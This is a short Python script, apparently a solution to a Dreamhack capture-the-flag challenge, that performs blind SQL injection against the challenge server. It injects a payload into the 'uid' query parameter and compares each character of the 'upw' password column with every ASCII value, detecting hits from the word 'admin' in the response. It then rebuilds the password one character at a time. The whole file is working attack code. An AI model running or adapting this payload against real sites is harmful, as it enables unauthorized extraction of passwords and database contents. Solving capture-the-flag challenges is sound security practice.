import requests

cookie = {}
flag = []

for i in range(44):
    for x in range(127):
        url = "http://host3.dreamhack.games:15909/"
        param = '?uid=%27||(ascii(substr(upw,' + str(i) + ',1)))like(' + str(x) + ')%23'
        newURL = url + param
        res = requests.get(url=newURL, cookies=cookie)

        if res.text.find("admin") > 0:
            flag.append(chr(x))
            print(str(i) + ' flag is' + flag[i-1])


print(str(flag))
